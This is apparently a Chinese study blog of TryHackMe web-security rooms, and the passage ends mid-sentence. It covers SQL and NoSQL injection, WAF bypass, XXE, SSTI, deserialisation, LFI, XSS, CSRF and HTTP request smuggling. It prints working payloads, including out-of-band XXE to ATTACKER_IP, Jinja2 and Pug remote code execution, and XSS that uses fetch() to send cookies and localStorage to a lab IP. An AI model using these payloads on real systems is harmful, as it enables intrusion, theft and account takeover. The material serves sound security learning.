利用详细错误信息攻击者可以利用应用程序返回的详细错误信息来获取数据库的架构和结构。基于错误的 SQL 注入就是指通过精心构造查询，故意让应用程序生成包含有用信息（如数据库版本、表名、列名等）的错误消息。例如，使用 1&#39; AND 1=CONVERT(int, (SELECT @@version)) -- 这样的语句，可以触发错误并泄露数据库的版本信息。 绕过 WAF 和过滤器为了绕过 Web 应用防火墙（WAF）和输入过滤器，渗透测试人员会尝试各种混淆技术。这包括： 大小写混合 (SeLeCt)。 字符串连接 (CONCAT(CHAR(83), CHAR(69), CHAR(76), CHAR(69), CHAR(67), CHAR(84)) 来代替 SELECT)。 使用不同的编码方式（如十六进制编码、URL 编码）。 利用内联注释 (/**/) 和不同字符编码（如 %09 代表制表符，%0A 代表换行符）来绕过简单的过滤器。 数据库指纹识别确定数据库的类型和版本是定制攻击的关键一步。这可以通过发送特定的查询来实现，因为不同的 DBMS 会对相同的查询给出不同的结果。例如，SELECT version() 在 PostgreSQL 上有效，而 SELECT @@version 则适用于 MySQL 和 MSSQL。通过这些差异，攻击者可以准确识别目标数据库。 利用 SQL 注入进行内网渗透SQL 注入漏洞不仅能获取数据库信息，还可以作为跳板，进一步渗透到网络的其他部分。一旦数据库服务器被攻破，它就可以被用来访问其他内部系统。这可能涉及从数据库中提取凭据（如用户名和密码），或者利用系统之间已存在的信任关系来扩大攻击范围。 NO SQLNo SQL 注入注入类型 语法注入 类似于传统的 SQL 注入了，操纵语句导致执行非预期行为 操作符注入 而这个就是用 NoSQL 特殊的操作符，改变逻辑代码的行为了 1db.users.find({ username: &#39;admin&#39;, password: { &quot;$ne&quot;: null } }); 操作符注入1[&#39;username&#39;=&gt;[&#39;$ne&#39;=&gt;&#39;xxxx&#39;], &#39;password&#39;=&gt;[&#39;$ne&#39;=&gt;&#39;yyyy&#39;]] 这样一个代码就能把整个数据库 dump 出来。 POST 请求传数组HTTP 的语法 key[subkey]=value 123456789101112131415user[$ne]=xxxx&amp;pass[$ne]=yyyy # 登录 admin 之外的用户 user[$nin][]=admin&amp;pass[$ne]=yyyy # nin 接收的是一个数组，用这种方式来拼接的 user[$nin][]=admin&amp;user[$nin][]=pedro&amp;user[$nin][]=john&amp;user[$nin][]=secret&amp;pass[$ne]=yyyy # 爆破密码位数 user=john&amp;pass[$regex]=^.{8}$ # 爆破密码 user=john&amp;pass[$regex]=^1.......$ 10584312 语法注入这一节就有点抽象了，要结合具体代码来理解，原始代码如下 1for x in mycol.find({&quot;$where&quot;: &quot;this.username == &#39;&quot; + username + &quot;&#39;&quot;}): 发现注入这是我们加了一个 &#39; 让他报错得出来的原始代码，这个其实是三个部分拼接而成的 “this.username &#x3D;&#x3D; ‘“ username “‘“ 如果我们加了一个 &#39; 执行的语句就变成了 1&quot;this.username == &#39;admin&#39;&#39;&quot; 那肯定会报错的 验证注入第一次输入：admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x 执行的语句变成 1&quot;this.username == &#39;admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x&#39;&quot; &quot;this.username == &#39;admin&#39; 这是一个布尔值， &amp;&amp; 0 与任何值计算都是 false，所以折一整个语句都会是 false。 &amp;&amp; &#39;x 的作用是为了闭合原始查询中剩下的引号。 第二次输入： admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x 执行的语句为： 1&quot;this.username == &#39;admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x&#39;&quot; 执行结果为真，返回结果，证明注入存在。 利用注入Payload：admin&#39;||1||&#39; 具体执行的代码： 1&quot;this.username == &#39;admin&#39;||1||&#39;&#39;&quot; 不论 admin 存在和不存在，这个表达式都能返回真，导致整个数据库泄露。 XXE 注入介绍了一堆实体和解析器，不懂，没了解过 payload 主要是下面这个，用自带的实体解析器，去执行语句或者读取文件 12&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt&quot; &gt;]&gt; 带外 XXE 构建一个 DTD 文件 123 %oobxxe; payload 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;!DOCTYPE upload SYSTEM &quot;http://ATTACKER_IP:1337/sample.dtd&quot;&gt; &lt;upload&gt; &lt;file&gt;&amp;exfil;&lt;/file&gt; &lt;/upload&gt; 攻击机起一个 http 服务端，会接收到拿回来的数据。 SSRF + XXE同样的套路，payload 如下，要配合 Burp 使用，遍历这个主机上的端口 123456789&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;http://localhost:§10§/&quot; &gt; ]&gt; &lt;contact&gt; &lt;name&gt;&amp;xxe;&lt;/name&gt; &lt;email&gt;test@test.com&lt;/email&gt; &lt;message&gt;test&lt;/message&gt; &lt;/contact&gt; 缓解措施最佳实践禁用外部实体和 DTDs 使用简单数据格式，比如说 JSON 增强输入校验，检验输入数据是否符合特定的格式，还有过滤一些 XML 特有的符号，比如 &lt;, &gt;, &amp;, &#39;, and &quot; Server-side Template Injection主要还是用了那个模板引擎的一些模板语法，造成注入 区分模板引擎Twig 执行 &#123;&#123;7*7'&#125;&#125; 会输出 49，Jinja2 则会输出 7777777 Jade&#x2F;Pug，则是用 # 代表模板语法，#{7*7} would return 49 PHP - Smarty12345# 输出结果会全部变成大写 {&#39;Hello&#39;|upper} # 可以直接调用 PHP 语法 {system(&quot;ls&quot;)} NodeJS - Pug关键漏洞点 JavaScript 执行 Pug 允许嵌入 JS 语句在 #{} 里面，会被当成 JS 代码执行，造成任意代码执行。 默认转义 Pug 模板引擎在渲染时，会自动对某些输出进行 HTML 转义 (HTML Escaping)。这意味着当你在模板中使用标准的 #&#123;&#125; 进行变量插值时，Pug 会把 HTML 特殊字符（比如 &lt;、&gt;、&amp;、&quot;、&#39;）转换成它们的 HTML 实体编码。 #&#123;&#125; (默认行为)： HTML 转义，主要用于防 XSS。 !&#123;&#125; (非转义)： 不进行 HTML 转义，因此如果使用不当，容易导致 XSS。 默认转义的局限性： 尽管能防大部分 XSS，但对 !&#123;&#125; 无效，且不能阻止服务端层面的代码执行（SSTI 本身），因为 SSTI 发生在模板渲染的服务器端，而 HTML 转义是针对生成 HTML 内容的。 利用 Payload1#{root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout} spawnSync 不能直接传命令执行，它不会自动解析你传入的命令字符串中的参数。它会把整个字符串当作一个单一的命令来尝试执行，而不是拆分成命令和独立参数。 1234spawnSync(command, [args], [options]) # 最终 payload #{root.process.mainModule.require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;, [&#39;7f58571b42d8c477a2f3efa69a681ac3.txt&#39;]).stdout} Python - Jinja2Jinja2 解析表达式用的是花括号，测试 payload &#123;&#123;7*7&#125;&#125; 一旦确定能执行的话，我们就可以用这个 payload 来实现 RCE 1{{&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output(&quot;cat 5d8bea6df83cbb6767a235c4ba54933b.txt&quot;)}} 拆解一下 payload &quot;&quot;.__class__.__mro__[1] 这个方法能访问到基类 object ，他是所有 python 类的父类。 __subclasses__(): 把 object 的所有子类显示出来, 然后 [157] 一般是 subprocess.Popen 类的索引（这个索引数和目标环境有关系）。 然后如果你用 check_output 的话，执行带参数的命令他会当作一个完整的可执行程序名去查找和运行，而不是把 cat 当作程序，文件名当作参数。 1{{&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output([&quot;cat&quot;,&quot;5d8bea6df83cbb6767a235c4ba54933b.txt&quot;])}} 自动化利用工具SSTImap 挑战题目给了一个 Form Tools 的靶场，在网上搜了一下发现有洞，一个是 SSRF，在创建模板的页面里面有一个智能爬取功能，会执行 curl，还有一个是 SSTI，给的提示说是改 Page Theme 不过我改的 Page Titles 能起作用，不过每次都要重新登录一下账号才能起作用，最后还是拿到 flag。 LDAP 注入这个 LDAP 和 AD 强关联 LDAP 搜索语法 123(base DN) (scope) (filter) (attributes) ldapsearch -x -H ldap://10.10.55.42:389 -b &quot;dc=ldap,dc=thm&quot; &quot;(ou=People)&quot; 其实也是一个通配符引起的注入，一个 * 干全部。 Injects用下面这个语句登录进了普通管理页面，没啥用，看了一下别人的 wp 是用 SQL 注入字典跑出来的，我也整理了一份。 11%27%09||%091=1%09--%09 SSTI 利用则参考：https://www.freebuf.com/articles/web/314028.html 1{{[&quot;cat ./flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt&quot;, 0]|sort(&quot;passthru&quot;)}} Insecure Deserialisation终于讲到反序列化了 鉴别能访问到源码观察 serialize(), unserialize(), pickle.loads() 和其他的方法 不能访问到源码也就是黑盒测试，试着加 ~ 在文件末尾，这可能会访问到之前因为编辑留下来的备份文件什么的。或者 .bak 之类的试试。 分析服务器响应 可能会抛出相关方法的错误消息 修改 POST 和 Cookie ，观察程序的反应，可能会有洞 检查 CookieCookie 可能包含一些反序列化的数据 base64 编码的 cookie：PHP 和 NET ASP：__VIEWSTATE 自动化脚本PHPGGC1234567php phpggc -l # 查看 payload php phpggc -l Laravel # 生成 payload php phpggc -b Laravel/RCE3 system whoami 通过 Payload + APP_KEY 生成可利用的 payload，这里 THM 有一个网页帮我们实现这一点 http://10.10.82.141:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY%3D&amp;payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0%3D 执行 payload 12345# whoami curl 10.10.82.141:8089 -X POST -H &#39;X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ==&#39;| head -n 2 # uname -r curl 10.10.82.141:8089 -X POST -H &#39;X-XSRF-TOKEN: eyJpdiI6Ikx4REd5Um5jY0xqa0JYWmlNVnlSRGc9PSIsInZhbHVlIjoiSHRONWhPXC9VK29rY2YrcjFBY2JkblRVM3ZHM1FHcWN4MUZpY0NITmh0cTdrZEE2bytFajdnUm0xVThPYTd4VXRZZ2NNd29jRVhRNmpoZUsxNEdrV05FVmU2eUpkUHJBdDZrVlNITXF3UVptMlpWaVBCWEoyeEV4bjMxMjQzMWdMemk2V1U1ZU5DSFRBdFwvdHBSb0lLdDlUS1dIXC9qK0ZnUUc2R0I1c3ZPbHFyYWMxR0d3VDBPSGlGTXYydmVDOXFzTkxQS0tcL0FBOGljWks0cXVHcWpETHYrS3FDSXp3M1l1Vm9wWDA3VVU0a05sM2VTNm5NbW1WcDdGeDBzR29WN0g5clZvUThRNFd6T0F2ek1ZN09ac1wvamdGcEV3RitEK3lnYTA4c2FHazZHdlB0SVhBb2prXC9NV0FNSWNYV2NWU3MiLCJtYWMiOiJjOTgyZjgzYmQwZWZkZmJkY2JiYjkyZWJhZDNjN2IwODk2NGZjNmVhODMzYmM2NzdjZTViN2UwNDI1ZWIxMzMzIn0=&#39;| head -n 2 Java 反序列化利用工具ysoserial SSRF我觉得他说的有意义的一点就是可以用 SSRF 去 DDOS，这也是一种反射式攻击了，其他的倒没说什么。 补救措施输入强校验 白名单 网络隔离 实行强访问控制 全面日志监控 File Inclusion, Path TraversalLFI 可以用 PHP Wrappers1php://filter/convert.base64-encode/resource=/etc/passwd Data Wrapper1data:text/plain,&lt;?php%20phpinfo();%20?&gt; LFI2CE - Session Filessession 投毒，想办法往 session 里面写东西，然后用 LFI 去访问那个文件 1php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydscyddKTtlY2hvICdTaGVsbCBkb25lICEnOyA/Pj4= Prototype Pollution这个房间讲了一下原型链污染，主要还是这种 OOP 语言有继承的特性，而 JS 子类的方法全是在一个链上的，他的子类有他链上的所有方法。 用 __proto__ 可以访问到一个对象的原型。 1{&quot;__proto__&quot;: {&quot;toLocaleString&quot;: &quot;Just crash the server&quot;}} Include这个房间用了原型链调用，SSRF，LFI 加日志污染，日志污染没有实操过，我自己的思路是对的，但是卡在那里了，看了一下 writeup 秒解 https://medium.com/@z0diac/include-ctf-tryhackme-writeup-c36bded6d2f4 DOM XSS 12345&lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;));&quot;&gt; &lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt; &lt;img src=&quot;nonexistent.jpg&quot; onerror=&quot;this.onerror=null; setTimeout(() =&gt; { fetch(&#39;http://10.14.106.192/?secret=&#39; + localStorage.getItem(&#39;secret&#39;)); }, 6000);&quot;&gt; CORS &amp; SOP这个房间就讲 CORS 和同源策略了 SOP 以下几点要注意 即便是同一个域名，不同端口，也是会被影响的，就不用说 HTTP 和 HTTPS 了。 SOP 不仅仅只应用于脚本上，他应用在网页上所有的东西，也就是有 URL 引入，要调用的东西（有歧义，待完善） SOP 并不是阻止了所有的跨站通信，CORS 就是用来解决这点的 CORS服务器不会阻拦请求，而是浏览器通过服务器发来的 CORS header 处理这条请求，实际上是浏览器这边作的处理。 CORS 中不同的 HTTP 头 Access-Control-Allow-Origin: This header specifies which domains are allowed to access the resources. For example, Access-Control-Allow-Origin: example.com allows only requests from example.com. Access-Control-Allow-Methods: Specifies the HTTP methods (GET, POST, etc.) that can be used during the request. Access-Control-Allow-Headers: Indicates which HTTP headers can be used during the actual request. Access-Control-Max-Age: Defines how long the results of a preflight request can be cached. Access-Control-Allow-Credentials: This header instructs the browser whether to expose the response to the frontend JavaScript code when credentials like cookies, HTTP authentication, or client-side SSL certificates are sent with the request. If Access-Control-Allow-Credentials is set to true, it allows the browser to access the response from the server when credentials are included in the request. It’s important to note that when this header is used, Access-Control-Allow-Origin cannot be set to * and must specify an explicit domain to maintain security. 1234567891011121314# 偷 Cookie XSS &lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.cookie));&quot;&gt; # 偷页面内容 XSS &lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; fetch(&#39;http://10.14.106.192/?data1=&#39;+encodeURIComponent(document.documentElement.outerHTML));&quot;&gt; &lt;img src=&quot;x&quot; onerror=&quot;this.onerror=null; window.location.href=&#39;http://10.14.106.192:81/index.html&#39;;&quot;&gt; &lt;script&gt; window.location.href=&#39;http://10.14.106.192:81/&#39;; &lt;/script&gt; &lt;iframe style=&quot;display:none;&quot; src=&quot;http://10.14.106.192:81/&quot;&gt;&lt;/iframe&gt; XSS + CSRF 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;script&gt; // 1. 定义你要发送的 POST 请求的目标 URL const targetUrl = &#39;http://target.com/change_password.php&#39;; // 替换为实际目标 URL // 2. 定义 POST 请求要发送的数据（JSON 格式） const postData = { username: &#39;attacker_controlled_name&#39;, email: &#39;attacker@example.com&#39;, // ... 其他你想修改的字段 }; // 3. 使用 fetch API 发送 POST 请求 fetch(targetUrl, { method: &#39;POST&#39;, // 指定为 POST 请求 headers: { &#39;Content-Type&#39;: &#39;application/json&#39;, // 设置 Content-Type，通常是 JSON // 可以添加其他需要的头部，例如 Authorization header 如果需要 }, body: JSON.stringify(postData), // 将 JavaScript 对象转换为 JSON 字符串作为请求体 credentials: &#39;include&#39; // **关键：确保浏览器自动携带目标域的 Cookie** }) .then(response =&gt; { // 4. 请求成功后，如果服务器响应 CORS 头允许，可以读取响应 // 这里的 XSS 使得你处于同源上下文，所以通常可以读取响应 if (response.ok) { return response.json(); // 如果响应是 JSON } throw new Error(&#39;Network response was not ok.&#39;); }) .then(data =&gt; { console.log(&#39;Profile update response:&#39;, data); // 5. 如果你想将响应数据回传到你的服务器，可以再次发起一个请求 fetch(&#39;http://10.14.106.192/log_data.php&#39;, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/json&#39; }, body: JSON.stringify({ stolen_response: data, victim_url: window.location.href }) }); }) .catch(error =&gt; { console.error(&#39;There was a problem with the fetch operation:&#39;, error); }); &lt;/script&gt; 1234567891011121314151617181920&lt;script&gt; const targetUrl = &#39;http://worldwap.thm:8081/change_password.php&#39;; const postBody = &#39;new_password=hacked123&#39;; fetch(targetUrl, { method: &#39;POST&#39;, headers: { &#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39; }, body: postBody }).then(response =&gt; { if (response.ok) { console.log(&#39;Password change request sent successfully. Status:&#39;, response.status); } else { console.error(&#39;Password change request failed. Status:&#39;, response.status); } }).catch(error =&gt; { console.error(&#39;An error occurred during the password change request:&#39;, error); }); &lt;/script&gt; 1234567891011121314151617181920&lt;script&gt; var targetUrlEncoded = &#39;aHR0cDovL3dvcmxkd2FwLnRo bT o4MDgxL2NoYW5nZV9wYXNzd29yZC5waHA=&#39;; var targetUrl = atob(targetUrlEncoded.replace(/\\s/g, &#39;&#39;)); var postBody = &#39;new_password=hacked123&#39;; var xhr = new XMLHttpRequest(); xhr.open(&#39;POST&#39;, targetUrl, true); xhr.setRequestHeader(&#39;Content-Type&#39;, &#39;application/x-www-form-urlencoded&#39;); xhr.withCredentials = true; xhr.onload = function() { if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) { console.log(&#39;Password change request sent. Status:&#39;, xhr.status); } else { console.error(&#39;Password change request failed. Status:&#39;, xhr.status, xhr.statusText); } }; xhr.onerror = function() { console.error(&#39;Network error during password change request.&#39;); }; xhr.send(postBody); &lt;/script&gt; 这一关还挺好玩的，要用到 CSRF，之前有印象但是没做笔记，用的是 XHR 来实现的，然后还对 url 做了 base64，避免 URL 被转成 a 标签。 HTTP Request Smuggling这个房间就是利用前端和后端服务器对一个请求的处理不一致导致的问题，里面主要用到的是一些 HTTP Header 的错配导致的问题，用到的主要有 Content-Length 和 Transfer-Encoding。还有一个就是计算 \\r 和 \\n 是否统计成字符数的问题。通过后面那个实操我感觉就像缓存投毒，会在一个连接里面复用，然后把其他用户的数据发到了不该发到的地方，这个直接应该是前端 - 后端这个过程中发生的。 现代基架文中指出了现在的 Web 应用不是那么的直接了，大多都是由多个部分组成的，一般有以下几个部分： 前端服务器 后端服务器 数据库 APIs 微服务：一般用 HTTP&#x2F;REST 或 gPRC 负载均衡 反代 缓存机制的职责缓存是一种技术，用于存储并重复利用之前获取的数据或计算结果，以加速后续的请求和计算。 在目前 Web 基础架构下，缓存有如下几点： 内容缓存：一般缓存的是不会频繁刷新的内容，比如图片，CSS 和 JS。缓存机制能减少 Web 服务器的负载和加速用户的访问 数据库查询缓存：避免重复查 页面缓存：缓存整个网页，我猜这个是在 CDN 场景分发静态界面用到的 边缘缓存&#x2F;CDNs API 缓存 HTTP 请求头每个 HTTP 头都有两个主要部分：header 和 body Request Line：请求行是 HTTP 请求的第一行。它至少包含三个部分： 方法（Method）：一个单词的命令，告诉服务器如何处理请求的资源。例如，GET 或 POST。 路径（Path）：URL 的路径部分，用于标识服务器上的具体资源（例如，/admin/login）。 HTTP 版本号（HTTP Version Number）：表明客户端遵循的 HTTP 规范版本。 值得注意的是，HTTP&#x2F;2 和 HTTP&#x2F;1.1 在结构上有所不同。 Request Header：这部分包含请求的元数据，比如发送内容的类型（Content-Type）、期望的响应格式，以及认证令牌（Authentication Tokens）等。 Message Body：这是请求的实际内容。对于 GET 请求，消息体通常是空的；但对于 POST 请求，它可能包含表单数据、JSON 数据包或上传的文件。 Content-Length Header Content-Length 标头表示请求或响应正文的大小（以字节为单位）。它告知接收服务器需要多少数据，以确保接收到全部内容。 Transfer-Encoding Header Transfer-Encoding 标头用于指定应用于 HTTP 请求或响应的信息体的编码形式。该标头的常用值是 “chunked（分块）”，表示信息体被分成一系列块，每个块前面都有十六进制格式的大小。 12345678POST /submit HTTP/1.1 Host: good.com Content-Type: application/x-www-form-urlencoded Transfer-Encoding: chunked b q=smuggledData 0 这个例子中 q=smuggledData 大小是 11 字节，后面是新的一行。请求以一行 “0 ”结束，表示信息体的结束。每个分块的大小都以十六进制格式给出，分块正文的结束由大小为 0 的分块表示。 HTTP Request Smuggling Origin如果 CL 和 TE 一起用的话，这种就容易引起问题，因为一些组件可能优先用 CL，也可能用 TE。这种缺陷就导致了一个组件觉得这个请求结束了，但是另一个组件认为他仍然存在，导致问题出现。 举例说明：假设前端服务器用 CL 来确定一个请求的结束然而后端服务器用的 TE。攻击者可以伪造一个请求，在前端服务器看来是一个边界，而在后端服务器看来是另一个边界。这可能导致一个请求被偷渡到另一个请求中，造成意想不到的行为和潜在漏洞。 不同类型的偷渡注意：这里指的前端服务器不单单指的是通俗意义上的网页前端服务器，而是广泛意义上的前端，比如说反代入口，负载均衡入口等等。 CL.TE这种类型就是前端服务器用 CL 头，后端服务器用 TE。 12345678910111213POST /search HTTP/1.1 Host: example.com Content-Length: 130 Transfer-Encoding: chunked 0 POST /update HTTP/1.1 Host: example.com Content-Length: 13 Content-Type: application/x-www-form-urlencoded isadmin=true 这个例子就是 CL 为 130 字节，前端服务器认为这个请求在 isadmin=true 后面结束，但是后端服务器看到了 TE 是 chunk，所以认为 0 是这个块的结尾，后面的是一个新的请求。可能会导致未授权访问的发生。 不正确的 CL如果 CL 少于实际的数据大小，他会按 CL 的数据来读取，这就会导致数据被截断了（也要看具体的应用服务器）。 TE.CL和 CL.TE 不同，这种就完全反过来了，前端用的 TE，后端用的 CL。 12345678910111213POST / HTTP/1.1 Host: example.com Content-Length: 4 Transfer-Encoding: chunked 78 POST /update HTTP/1.1 Host: example.com Content-Type: application/x-www-form-urlencoded Content-Length: 15 isadmin=true 0 在上面的示例中，前端服务器看到了 Transfer-Encoding: chunked ，把这个请求当成块处理， 78 标识接下来的 120 个字节是当前请求体的一部分，前端服务器会认为最后一个 0 之前的所有数据都是这个请求的一部分。 然而，后端服务器会使用 Content-Length 头，该头被设置为 4。它只会处理请求的前 4 个字节（78 \\r \\n）。请求的剩余部分（从 POST /update 开始）随后会被后端服务器解释为一个独立的新请求。 TE.TETE.TE 漏洞不总是需要多个 Transfer-Encoding 头。相反，它通常涉及一个单独的、格式错误的 Transfer-Encoding 头，这个头被前端和后端服务器以不同的方式解释。 攻击者通过包含“chunked”的畸形变体来操纵 Transfer-Encoding 头。这样做是为了利用前端和后端服务器在优先级上如何处理 Transfer-Encoding (TE) 头而不是 Content-Length (CL) 头。通过构造畸形的 Transfer-Encoding 头，攻击者旨在使其中一台服务器忽略 TE 头而转而使用 CL 头，从而导致前端和后端服务器在解释请求边界时出现差异。这种操纵可能导致出现 CL.TE 或 TE.CL 情况，具体取决于哪台服务器退而使用 Content-Length。 12345678910111213POST / HTTP/1.1 Host: example.com Content-length: 4 Transfer-Encoding: chunked Transfer-Encoding: chunked1 4e POST /update HTTP/1.1 Host: example.com Content-length: 15 isadmin=true 0 前端服务器会遇到两个 Transfer-Encoding 头。第一个是标准的 chunked 编码，但第二个 chunked1 是非标准的。根据其配置，前端服务器可能会基于第一个 Transfer-Encoding: chunked 头来处理请求，并忽略畸形的 chunked1，从而将直到 0（表示分块消息结束）之前的所有内容都解释为单个分块消息的组成部分。 然而，后端服务器可能会以不同方式处理畸形的 Transfer-Encoding: chunked1。它可能要么拒绝畸形部分并像前端服务器一样处理请求，要么由于存在非标准头而以不同方式解释请求。如果它仅处理 Content-length: 4 所指示的前 4 个字节，那么从 POST /update 开始的请求剩余部分随后将被视为一个独立的、新的请求。 被走私的请求（包含 isadmin=true 参数）将由后端服务器处理，就好像它是一个合法且独立的请求一样。根据服务器功能和 /update 端点的性质，这可能导致未经授权的操作或数据修改。 TBH 我不理解🤔为什么会出现未授权访问呢，后端不加鉴权的吗，为什么简单的绕过就能绕过这个鉴权？后面那个实操我倒能理解，他把别人的请求混在一起夹带到另一个会话了，导致我能偷他的数据。 Walkthrough构造了一个 ATS (Apache Traffic Server) 作为前端代理, Nginx 作为 Web 服务器后端，PHP 处理动态内容。由于 ATS 和 Nginx 优先处理 Content-Length 和 Transfer-Encoding 标头的方式不同，存在 HTTP 请求走私的可能性。 1234567891011121314POST / HTTP/1.1 Host: httprequestsmuggling.thm Content-Type: application/x-www-form-urlencoded Content-Length: 160 Transfer-Encoding: chunked 0 POST /contact.php HTTP/1.1 Host: httprequestsmuggling.thm Content-Type: application/x-www-form-urlencoded Content-Length: 500 username=test&query=§ 这个 payload，前端解析了 Content-Length，认为这是一整个请求，把他转发到后端，然而后端服务器优先解析 Transfer-Encoding，把 0 前面的请求截断，然后认为第二部分的 POST 请求是一个全新的请求。 然后疑似这个房间有 bug，过不去，搁置了。 总结HTTP 请求走私由于服务器对请求头的解析不一导致的。 缓解方法 统一的头部处理： 确保所有服务器以相同的方式处理 HTTP 头部，以防止出现请求走私的机会。 采用 HTTP&#x2F;2： 转向使用 HTTP&#x2F;2 可以增强对请求边界的管理，从而降低走私的风险。 持续监控和审查： 密切关注服务器流量中是否存在请求走私的迹象，并定期进行检查以维护安全的服务器配置。 团队意识： 确保开发和运维团队都了解请求走私的危险以及相应的预防措施。 HTTP&#x2F;2 Request SmugglingHTTP&#x2F;2最大的区别是它更改了消息的格式，完全用二进制的格式，而不是 HTTP&#x2F;1.1 那种人类可读的格式。 以下是 HTTP&#x2F;2 请求的几个主要组成部分： 伪头部（Pseudo-headers）：HTTP&#x2F;2 定义了一些以冒号 : 开头的特殊头部。这些是构成一个有效 HTTP&#x2F;2 请求的最小必需字段。例如，你可以在上图中看到 :method、:path、:scheme 和 :authority 等伪头部。 常规头部（Headers）：在伪头部之后，是常规的 HTTP 头部，例如 user-agent 和 content-length。请注意，HTTP&#x2F;2 强制使用小写来表示这些头部名称。 请求体（Request Body）：与 HTTP&#x2F;1.1 类似，请求体包含随请求发送的任何额外信息，例如 POST 请求的参数、上传的文件或其他数据。 另一个重要的结构性改变，虽然可能不那么明显，但在于 HTTP&#x2F;2 为请求或响应的每个部分建立了精确的边界。HTTP&#x2F;2 不再像 HTTP&#x2F;1.1 那样依赖 \\r\\n 等特定字符来分隔不同的头部，或者依赖冒号 : 来分隔头部名称和值。相反，HTTP&#x2F;2 引入了明确的字段来跟踪请求（或响应）中每个部分的大小。 Request Smuggling and HTTP&#x2F;2HTTP 请求走私之所以在 HTTP&#x2F;1 场景下成为可能，主要原因在于存在多种定义请求体大小的方式。 协议中的这种模糊性导致不同的代理服务器对请求何时结束以及下一个请求何时开始有各自的解释，最终引发了请求走私的情况。 在 HTTP 请求走私的语境下，我们最关注的一点是：HTTP&#x2F;2 明确定义了请求各部分的大小。 为了避免 HTTP&#x2F;1 中的这种不确定性，HTTP&#x2F;2 在每个请求组件前添加了一个包含其大小的字段。例如，每个头部都会被前置一个表示其大小的字段，这样解析器就能精确地知道需要读取多少信息。为了更好地理解这一点，我们来看看在 Wireshark 中捕获到的一个请求，特别是请求头部分： 在图片中，我们看到的是 :method 伪头部。正如我们所观察到的，无论是头部名称还是头部值都带有各自的长度前缀。头部名称的长度是 7，对应着 :method；而头部值的长度是 3，对应着字符串 GET。 请求体同样包含一个长度指示器，这使得 Content-Length 和 Transfer-Encoding: chunked 等头部在纯粹的 HTTP&#x2F;2 环境中变得毫无意义。 注意： 尽管 HTTP&#x2F;2 不会直接使用 Content-Length 头部，但现代浏览器在特定情况下（即可能发生 HTTP 降级时）仍会包含这些头部。 有了这样清晰的请求各部分边界，人们可能会认为请求走私是不可能的，在完全依赖 HTTP&#x2F;2 的实现中，某种程度上确实如此。然而，与任何新协议版本一样，并非所有设备都能直接升级。这导致了许多负载均衡器或反向代理虽然支持 HTTP&#x2F;2，但却从仍然使用 HTTP&#x2F;1 的服务器集群中提供内容。 我觉得最大的区别就是去掉了 \\r\\n ，然后加了类似 TLV 这样的格式，还在必须要有的字段加了一个伪头部。 HTTP&#x2F;2 DesyncHTTP&#x2F;2 Downgrading当用户（或攻击者）与前端反向代理之间使用 HTTP&#x2F;2，而前端代理与后端服务器之间仍使用 HTTP&#x2F;1.1 时，我们称之为 HTTP&#x2F;2 降级（downgrading）。 在这种混合协议环境中，HTTP 